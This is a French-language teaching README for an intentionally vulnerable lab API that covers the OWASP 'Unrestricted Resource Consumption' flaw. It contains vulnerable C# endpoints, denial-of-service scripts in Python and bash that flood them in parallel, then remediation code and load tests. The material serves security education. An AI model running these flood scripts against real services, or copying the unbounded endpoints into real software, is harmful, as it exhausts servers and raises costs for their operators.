# API4:2023 - Unrestricted Resource Consumption

## 📋 Description de la vulnérabilité

La vulnérabilité **Unrestricted Resource Consumption** se produit lorsqu'une API ne limite pas correctement la consommation de ressources (CPU, mémoire, bande passante, stockage). Cette vulnérabilité permet aux attaquants de provoquer un déni de service (DoS) ou d'augmenter considérablement les coûts d'infrastructure.

### Impact potentiel
- Déni de service (DoS) de l'application
- Augmentation des coûts d'infrastructure (cloud, bande passante)
- Dégradation des performances pour les utilisateurs légitimes
- Épuisement des ressources serveur
- Indisponibilité du service

## 🎯 Endpoints vulnérables

Le contrôleur `Api04ResourceConsumptionController` expose plusieurs endpoints vulnérables :

### 1. **Listing sans pagination**
- `GET /api/rc/users/all` - Retourne tous les utilisateurs sans limite

### 2. **Export sans limite**
- `GET /api/rc/export-csv?count=100000` - Export CSV géant paramétrable

### 3. **Calculs intensifs**
- `GET /api/rc/hash-password?password=...&rounds=1000000` - Hachage avec nombre de rounds configurable

### 4. **Création en masse**
- `POST /api/rc/bulk-create-orders` - Création illimitée d'enregistrements

## 🔍 Code vulnérable expliqué

### Exemple 1 : Listing massif sans pagination

```csharp
[HttpGet("users/all")]
public async Task<IActionResult> GetAllUsers()
{
    // VULNÉRABLE: Charge tous les utilisateurs en mémoire
    var users = await _context.UserProfiles.ToListAsync();
    return Ok(users);
}
```

**Problèmes** :
- Pas de limite sur le nombre d'enregistrements
- Charge tout en mémoire
- Temps de réponse non borné
- Consommation mémoire incontrôlée

### Exemple 2 : Export CSV paramétrable

```csharp
[HttpGet("export-csv")]
public async Task<IActionResult> ExportCsv([FromQuery] int count = 100000)
{
    // VULNÉRABLE: L'utilisateur contrôle la taille de l'export
    var users = await _context.UserProfiles.Take(count).ToListAsync();
    var csv = new StringBuilder();
    csv.AppendLine("Id,Username,Email");
    foreach (var u in users)
    {
        csv.AppendLine($"{u.Id},{u.Username},{u.Email}");
    }
    var bytes = Encoding.UTF8.GetBytes(csv.ToString());
    return File(bytes, "text/csv", "users.csv");
}
```

**Problèmes** :
- Paramètre `count` non validé
- Construction d'une chaîne massive en mémoire
- Pas de streaming pour les gros fichiers

### Exemple 3 : Calcul intensif paramétrable

```csharp
[HttpGet("hash-password")]
public IActionResult HashPassword([FromQuery] string password, [FromQuery] int rounds = 1000000)
{
    // VULNÉRABLE: Nombre de rounds contrôlé par l'utilisateur
    using var deriveBytes = new Rfc2898DeriveBytes(password, 16, rounds);
    var hash = Convert.ToBase64String(deriveBytes.GetBytes(32));
    return Ok(new { hash });
}
```

**Problèmes** :
- Calcul CPU intensif
- Paramètre `rounds` sans limite
- Peut bloquer le thread pendant plusieurs secondes/minutes

### Exemple 4 : Création en masse sans limite

```csharp
[HttpPost("bulk-create-orders")]
public async Task<IActionResult> BulkCreateOrders([FromBody] List<Order> orders)
{
    // VULNÉRABLE: Pas de limite sur le nombre d'ordres
    await _context.Orders.AddRangeAsync(orders);
    await _context.SaveChangesAsync();
    return Ok(new { created = orders.Count });
}
```

**Problèmes** :
- Pas de limite sur la taille de la liste
- Transaction massive en base de données
- Consommation mémoire proportionnelle à la requête

## 💥 Scénarios d'exploitation

### Scénario 1 : Attaque par épuisement mémoire
```python
import requests
import concurrent.futures

def exhaust_memory(base_url):
    # Requête pour 10 millions d'utilisateurs
    url = f"{base_url}/api/rc/export-csv?count=10000000"
    
    # Lancer 10 requêtes en parallèle
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for i in range(10):
            future = executor.submit(requests.get, url)
            futures.append(future)
        
        # Attendre que toutes les requêtes se terminent
        for future in concurrent.futures.as_completed(futures):
            print(f"Requête terminée: {future.result().status_code}")
```

### Scénario 2 : Attaque par épuisement CPU
```bash
#!/bin/bash
# Lancer des calculs intensifs en parallèle
for i in {1..50}; do
    curl "http://localhost:5000/api/rc/hash-password?password=test$i&rounds=10000000" &
done
wait
```

### Scénario 3 : Remplissage de base de données
```python
import requests
import json

def fill_database(base_url):
    # Créer 100 000 ordres en une seule requête
    orders = []
    for i in range(100000):
        orders.append({
            "userId": 1,
            "amount": 99.99,
            "status": "pending"
        })
    
    response = requests.post(
        f"{base_url}/api/rc/bulk-create-orders",
        json=orders,
        headers={"Content-Type": "application/json"}
    )
    
    print(f"Créé {response.json().get('created')} ordres")
```

### Scénario 4 : Attaque combinée
```python
import threading
import requests

def combined_attack(base_url):
    def memory_attack():
        requests.get(f"{base_url}/api/rc/users/all")
    
    def cpu_attack():
        requests.get(f"{base_url}/api/rc/hash-password?password=test&rounds=5000000")
    
    def db_attack():
        orders = [{"userId": 1, "amount": 10} for _ in range(10000)]
        requests.post(f"{base_url}/api/rc/bulk-create-orders", json=orders)
    
    # Lancer 100 threads de chaque type d'attaque
    threads = []
    for _ in range(100):
        threads.append(threading.Thread(target=memory_attack))
        threads.append(threading.Thread(target=cpu_attack))
        threads.append(threading.Thread(target=db_attack))
    
    for t in threads:
        t.start()
```

## 🛡️ Solutions de remédiation

### 1. **Implémenter la pagination**

```csharp
[HttpGet("users")]
public async Task<IActionResult> GetUsers([FromQuery] int page = 1, [FromQuery] int pageSize = 20)
{
    // Valider et limiter la taille de page
    pageSize = Math.Min(pageSize, 100); // Maximum 100 par page
    page = Math.Max(page, 1);
    
    var totalCount = await _context.UserProfiles.CountAsync();
    var users = await _context.UserProfiles
        .OrderBy(u => u.Id)
        .Skip((page - 1) * pageSize)
        .Take(pageSize)
        .Select(u => new UserDto 
        { 
            Id = u.Id, 
            Username = u.Username, 
            Email = u.Email 
        })
        .ToListAsync();
    
    return Ok(new
    {
        data = users,
        pagination = new
        {
            currentPage = page,
            pageSize = pageSize,
            totalPages = (int)Math.Ceiling(totalCount / (double)pageSize),
            totalCount = totalCount
        }
    });
}
```

### 2. **Streaming pour les exports volumineux**

```csharp
[HttpGet("export-csv-secure")]
public async Task ExportCsvSecure()
{
    // Limite stricte sur le nombre d'enregistrements
    const int maxRecords = 10000;
    
    Response.ContentType = "text/csv";
    Response.Headers.Add("Content-Disposition", "attachment; filename=users.csv");
    
    // Utiliser un StreamWriter pour éviter de tout charger en mémoire
    await using var writer = new StreamWriter(Response.Body);
    await writer.WriteLineAsync("Id,Username,Email");
    
    var count = 0;
    await foreach (var user in _context.UserProfiles.AsAsyncEnumerable())
    {
        if (count >= maxRecords) break;
        
        await writer.WriteLineAsync($"{user.Id},{user.Username},{user.Email}");
        count++;
        
        // Flush périodiquement pour éviter l'accumulation en mémoire
        if (count % 1000 == 0)
        {
            await writer.FlushAsync();
        }
    }
}
```

### 3. **Limiter les calculs intensifs**

```csharp
private readonly SemaphoreSlim _hashingSemaphore = new(5); // Max 5 calculs simultanés

[HttpGet("hash-password-secure")]
public async Task<IActionResult> HashPasswordSecure([FromQuery] string password)
{
    // Validation des paramètres
    if (string.IsNullOrEmpty(password) || password.Length > 128)
    {
        return BadRequest("Invalid password");
    }
    
    // Limiter le nombre de rounds
    const int rounds = 10000; // Valeur fixe sécurisée
    
    // Limiter les calculs simultanés
    if (!await _hashingSemaphore.WaitAsync(TimeSpan.FromSeconds(5)))
    {
        return StatusCode(503, "Service busy");
    }
    
    try
    {
        // Utiliser une méthode de hachage moderne
        var hash = BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12);
        return Ok(new { hash });
    }
    finally
    {
        _hashingSemaphore.Release();
    }
}
```

### 4. **Limiter les opérations en masse**

```csharp
[HttpPost("bulk-create-orders-secure")]
public async Task<IActionResult> BulkCreateOrdersSecure([FromBody] List<Order> orders)
{
    // Limiter le nombre d'ordres
    const int maxOrders = 100;
    if (orders.Count > maxOrders)
    {
        return BadRequest($"Maximum {maxOrders} orders allowed per request");
    }
    
    // Valider chaque ordre
    foreach (var order in orders)
    {
        if (order.Amount <= 0 || order.Amount > 10000)
        {
            return BadRequest("Invalid order amount");
        }
    }
    
    // Utiliser une transaction avec timeout
    using var transaction = await _context.Database.BeginTransactionAsync();
    var cts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
    
    try
    {
        await _context.Orders.AddRangeAsync(orders, cts.Token);
        await _context.SaveChangesAsync(cts.Token);
        await transaction.CommitAsync(cts.Token);
        
        return Ok(new { created = orders.Count });
    }
    catch (OperationCanceledException)
    {
        await transaction.RollbackAsync();
        return StatusCode(504, "Operation timeout");
    }
}
```

### 5. **Implémenter le rate limiting**

```csharp
// Dans Program.cs
builder.Services.AddRateLimiter(options =>
{
    options.GlobalLimiter = PartitionedRateLimiter.Create<HttpContext, string>(
        httpContext => RateLimitPartition.GetFixedWindowLimiter(
            partitionKey: httpContext.User?.Identity?.Name ?? httpContext.Request.Headers.Host.ToString(),
            factory: partition => new FixedWindowRateLimiterOptions
            {
                AutoReplenishment = true,
                PermitLimit = 100,
                Window = TimeSpan.FromMinutes(1)
            }));
    
    // Limite spécifique pour les endpoints coûteux
    options.AddPolicy("expensive", httpContext =>
        RateLimitPartition.GetFixedWindowLimiter(
            partitionKey: httpContext.User?.Identity?.Name ?? httpContext.Request.Headers.Host.ToString(),
            factory: partition => new FixedWindowRateLimiterOptions
            {
                AutoReplenishment = true,
                PermitLimit = 10,
                Window = TimeSpan.FromMinutes(1)
            }));
});

// Dans le contrôleur
[HttpGet("export-csv-secure")]
[EnableRateLimiting("expensive")]
public async Task<IActionResult> ExportCsvSecure() { ... }
```

### 6. **Monitoring et alertes**

```csharp
public class ResourceMonitoringMiddleware
{
    private readonly RequestDelegate _next;
    private readonly ILogger<ResourceMonitoringMiddleware> _logger;
    
    public async Task InvokeAsync(HttpContext context)
    {
        var stopwatch = Stopwatch.StartNew();
        var startMemory = GC.GetTotalMemory(false);
        
        await _next(context);
        
        stopwatch.Stop();
        var memoryUsed = GC.GetTotalMemory(false) - startMemory;
        
        // Alerter si la requête prend trop de temps ou de mémoire
        if (stopwatch.ElapsedMilliseconds > 5000)
        {
            _logger.LogWarning("Slow request: {Path} took {ElapsedMs}ms", 
                context.Request.Path, stopwatch.ElapsedMilliseconds);
        }
        
        if (memoryUsed > 100_000_000) // 100 MB
        {
            _logger.LogWarning("High memory request: {Path} used {MemoryMB}MB", 
                context.Request.Path, memoryUsed / 1_000_000);
        }
    }
}
```

## 🔧 Bonnes pratiques

1. **Toujours paginer** : Ne jamais retourner des listes complètes
2. **Limiter les tailles** : Définir des limites maximales pour tous les paramètres
3. **Streaming** : Utiliser le streaming pour les gros fichiers
4. **Rate limiting** : Implémenter des limites de taux sur tous les endpoints
5. **Timeouts** : Définir des timeouts pour toutes les opérations
6. **Validation** : Valider tous les paramètres d'entrée
7. **Monitoring** : Surveiller l'utilisation des ressources
8. **Queues** : Utiliser des files d'attente pour les opérations longues
9. **Caching** : Mettre en cache les résultats coûteux
10. **Documentation** : Documenter les limites de l'API

## 📊 Tests de détection

### Test de charge avec Apache Bench
```bash
# Test de charge simple
ab -n 1000 -c 100 http://localhost:5000/api/rc/users/all

# Test avec requêtes volumineuses
ab -n 100 -c 10 "http://localhost:5000/api/rc/export-csv?count=1000000"
```

### Script de test Python
```python
import requests
import time
import psutil
import threading

def test_resource_consumption(base_url):
    results = {
        "memory_test": {"passed": False, "details": ""},
        "cpu_test": {"passed": False, "details": ""},
        "time_test": {"passed": False, "details": ""},
        "concurrent_test": {"passed": False, "details": ""}
    }
    
    # Test 1: Consommation mémoire
    try:
        response = requests.get(f"{base_url}/api/rc/export-csv?count=1000000", timeout=5)
        if response.status_code == 200:
            results["memory_test"]["details"] = "❌ Export illimité autorisé"
        else:
            results["memory_test"]["passed"] = True
            results["memory_test"]["details"] = "✅ Export limité ou refusé"
    except requests.Timeout:
        results["memory_test"]["details"] = "⚠️ Timeout - possible DoS"
    
    # Test 2: Consommation CPU
    start_time = time.time()
    try:
        response = requests.get(f"{base_url}/api/rc/hash-password?password=test&rounds=10000000", timeout=5)
        elapsed = time.time() - start_time
        if elapsed > 3:
            results["cpu_test"]["details"] = f"❌ Calcul trop long: {elapsed:.2f}s"
        else:
            results["cpu_test"]["passed"] = True
            results["cpu_test"]["details"] = "✅ Calcul limité"
    except requests.Timeout:
        results["cpu_test"]["details"] = "❌ Timeout - DoS CPU possible"
    
    return results
```

### Test avec JMeter

1. Créer un plan de test avec:
   - Thread Group: 100 utilisateurs
   - Ramp-up: 10 secondes
   - Durée: 5 minutes

2. Ajouter des échantillonneurs HTTP pour:
   - `/api/rc/users/all`
   - `/api/rc/export-csv?count=1000000`
   - `/api/rc/hash-password?password=test&rounds=5000000`

3. Surveiller:
   - Temps de réponse
   - Taux d'erreur
   - Utilisation CPU/mémoire du serveur

## ⚠️ Attention

Ce code est **intentionnellement vulnérable** et ne doit **JAMAIS** être utilisé en production. Il sert uniquement à des fins éducatives pour comprendre et apprendre à détecter les vulnérabilités de consommation de ressources.

## 📚 Références

- [OWASP API Security Top 10 2023 - Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- [Rate Limiting Best Practices](https://cloud.google.com/architecture/rate-limiting-strategies-techniques)
- [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)
- [DOS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)